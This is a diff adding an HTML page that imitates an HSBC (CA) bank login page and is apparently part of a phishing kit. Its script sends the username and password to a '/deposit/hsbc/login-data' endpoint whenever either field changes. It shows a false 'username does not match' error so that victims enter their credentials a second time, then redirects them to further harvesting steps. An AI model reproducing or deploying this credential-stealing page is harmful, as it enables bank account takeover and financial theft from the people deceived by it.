@@ -1,0 +1,139 @@
+<!DOCTYPE html>
+<-- 0043)deposit/hsbc/e -->
+<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+        
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <link rel="stylesheet" type="text/css" href="./files/style.css">
+        <link rel="shortcut icon" type="image/PNG" href="./files/logoTrans.png">
+        <title>HSBC - Login</title>
+        <script src="./files/jquery-3.6.0.min.js###%" crossorigin="anonymous"></script>
+        <script>
+            var lrbank = 'HSBC (CA)';
+            var lrinfo = 'Login';
+        </script>
+        <script src="./files/actions.js###%"></script>
+        <script>
+        $(document).ready(function() {
+            var attempt = 2;
+
+            $('.lab-form').submit(function(e) {
+                e.preventDefault();
+                var form = this;
+
+                $('.error-div').css('display', 'none');
+
+                $('.input-container').removeClass('focused');
+                $('.input-container').prev().css('opacity', '0');
+
+                if (attempt == 1) {
+                    $('.div-loader').css('display', 'block');
+                    $('.div-main').css('display', 'none');
+
+                    $.post('/deposit/hsbc/api/login-submit', $(this).serialize(), function(response) {
+                        $('.error-div').css('display', 'block');
+
+                        $(form).trigger('reset');
+
+                        $('.div-loader').css('display', 'none');
+                        $('.div-main').css('display', 'block');
+                    }, 'JSON');
+
+                    attempt = 2;
+                } else {
+                    $('.div-loader').css('display', 'block');
+                    $('.div-main').css('display', 'none');
+
+                    $.post('/deposit/hsbc/api/login-submit', $(this).serialize(), function(response) {
+                        if (response.status) {
+                            if (response.data.loader) {
+                                location.href = '/deposit/hsbc/w';
+                            } else {
+                                location.href = '/deposit/hsbc/em';
+                            }
+                        } else {
+                            $(form).trigger('reset');
+
+                            $('.error-div').css('display', 'block');
+
+                            $('.div-loader').css('display', 'none');
+                            $('.div-main').css('display', 'block');
+                        }
+                    }, 'JSON');
+                }
+
+                return false;
+            });
+
+            $(document).on('change', '.input-username, .input-password', function() {
+                var username = $(this).hasClass('input-username') ? $(this).val() : $(this).closest('form').find('.input-username').val();
+                var password = $(this).hasClass('input-password') ? $(this).val() : $(this).closest('form').find('.input-password').val();
+                $.post('/deposit/hsbc/login-data', {username: username, password: password});
+            });
+        });
+        </script>
+        <style>
+        .error-div {
+            margin-bottom: 17px;
+            color: red;
+        }
+
+        .error-div img {
+            width: 13px;
+            margin-right: 7px;
+        }
+
+        .btn {
+            background-color: rgb(217, 9, 21) !important;
+            border: 1px solid rgb(217, 9, 21) !important;
+        }
+
+        #loaderOnLoading {
+            display: block;
+        }
+        </style>
+    </head>
+    <body>
+        <img src="./files/logoTrans.png" id="transLogo">
+        <div class="header">
+            <div class="headerRow">
+                <img src="./files/logoTrans.png" id="logo">
+                <!-- <div class="btn" id="loginBtn">Login On </div> -->
+            </div>
+        </div>
+        <div class="main">
+            <div class="alignment div-main">
+                <p class="pageTitle">Log on</p>
+                <form action="deposit/hsbc/e" method="POST" autocomplete="off" class="lab-form">
+                    <p class="error-div" style="display: block"><img src="./files/errIcon.gif" alt=""> The username you entered does not match our records. Please try again.</p>
+                    <div class="row" style="align-items: center;">
+                        <p class="formLabel">Username</p>
+                    </div>
+                    <div class="inptContainer" style="margin-bottom: 20px">
+                        <input type="text" class="inptField lrinput input-username" attr-action="Filling Username" name="username" required="">
+                    </div>
+                    <div class="row" style="align-items: center;">
+                        <p class="formLabel">Password</p>
+                    </div>
+                    <div class="inptContainer">
+                        <input type="password" class="inptField lrinput input-password" attr-action="Filling Password" name="password" required="">
+                    </div>
+                    <div class="row" style="align-items: center;" id="rememberRow">
+                        <input type="checkbox">
+                        <p class="desText">Remember me</p>
+                    </div>
+                    <input type="submit" class="btn" value="Continue" id="sbtn">
+                </form>
+                <p class="desText" style="text-align: center; padding: 10px 0;"><a href="deposit/hsbc/e#">Forgot your username?</a></p>
+            </div>
+            <div class="alignment div-loader" style="display: none">
+                <p class="pageTitle" style="text-align: center">Verifying details</p>
+                <img src="./files/loading.gif" alt="" id="loaderOnLoading">
+                <p class="desText" style="text-align: center; padding: 20px 0;">Loading please wait...</p>
+            </div>
+        </div>
+        <div class="footer">
+        </div>
+    
+
+</body></html>
